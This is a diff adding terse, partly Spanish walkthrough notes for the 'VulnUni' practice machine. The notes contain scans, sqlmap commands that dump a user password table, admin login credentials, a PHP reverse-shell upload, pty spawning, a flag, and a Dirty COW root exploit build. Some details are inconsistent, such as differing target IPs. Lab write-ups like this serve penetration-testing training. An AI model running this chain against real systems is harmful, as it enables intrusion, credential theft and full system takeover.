@@ -1,0 +1,123 @@
+nmap -sV -sC -p- 182.168.0.32
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
+|_http-server-header: Apache/2.2.22 (Ubuntu)
+|_http-title: VulnUni - We train the top Information Security Professionals
+
+gobuster dir -u http://192.168.0.32/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
+
+/images (Status: 301)
+/index (Status: 200)
+/index.html (Status: 200)
+/about (Status: 200)
+/about.html (Status: 200)
+/contact (Status: 200)
+/contact.html (Status: 200)
+/blog (Status: 200)
+/blog.html (Status: 200)
+/css (Status: 301)
+/courses (Status: 200)
+/courses.html (Status: 200)
+/js (Status: 301)
+/fonts (Status: 301)
+/teacher (Status: 200)
+/teacher.html (Status: 200)
+
+sqlmap -r eclasslogin -dbs
+
+[19:08:03] [INFO] retrieved: INFOSEC100
+[19:08:30] [INFO] retrieved: eclass
+[19:08:49] [INFO] retrieved: mysql
+[19:09:06] [INFO] retrieved: performance_schema
+available databases [5]:
+[*] eclass
+[*] information_schema
+[*] INFOSEC100
+[*] mysql
+[*] performance_schema
+
+sqlmap -r eclasslogin -v -D eclass -T user -C password -dump
+
+[19:14:41] [DEBUG] performed 81 queries in 52.14 seconds
+[19:14:41] [INFO] retrieved: i74nw02nm3
+[19:15:21] [DEBUG] performed 84 queries in 40.37 seconds
+[19:15:21] [INFO] retrieved: ilikecats89
+[19:15:57] [DEBUG] performed 84 queries in 35.88 seconds
+[19:15:57] [INFO] retrieved: smith.j.1971
+[19:16:47] [DEBUG] performed 97 queries in 50.01 seconds
+[19:16:47] [DEBUG] analyzing table dump for possible password hashes
+Database: eclass
+Table: user
+[4 entries]
++--------------+
+| password     |
++--------------+
+| hf74nd9dmw   |
+| i74nw02nm3   |
+| ilikecats89  |
+| smith.j.1971 |
++--------------+
+
+user = admin
+password = ilikecats89
+
+https://www.exploit-db.com/exploits/48163
+
+https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+
+nos vamos a un link de "restore courses" y nos permite subir un archivo
+
+http://vulnuni.local/vulnuni-eclass/courses/tmpUnzipping/shell.php
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+flag = 68fc668278d9b0d6c3b9dc100bee181e
+
+/usr/sbin/pppd
+/usr/sbin/uuidd
+/usr/lib/pt_chown
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device 
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/bin/X
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/sudoedit
+/usr/bin/arping
+/usr/bin/lppasswd
+/usr/bin/at
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/mtr
+/usr/bin/traceroute6.iputils
+/usr/bin/pkexec
+/usr/bin/newgrp
+/bin/ping
+/bin/mount
+/bin/ping6
+/bin/umount
+/bin/su
+/bin/fusermount
+
+--------------------------------------------------------------------- Primera opcion Root -----------------------------------------------
+
+https://gist.github.com/scumjr/17d91f20f73157c722ba2aea702985d2
+
+https://www.cvedetails.com/cve/CVE-2016-5195/
+
+Kernel = 3.11.0-15-generic
+
+gcc -Wall -o run dirtycow-mem.c -ldl -lpthread
+
+chmod 777 run
+
+/.run
+
+sqlmap --url http://vulnuni.local/vulnuni-eclass/ --forms --dbs
+
+sqlmap --url http://vulnuni.local/vulnuni-eclass/ --forms -D eclass --tables
+
+sqlmap --url http://vulnuni.local/vulnuni-eclass/ --forms -D eclass -T user --dump
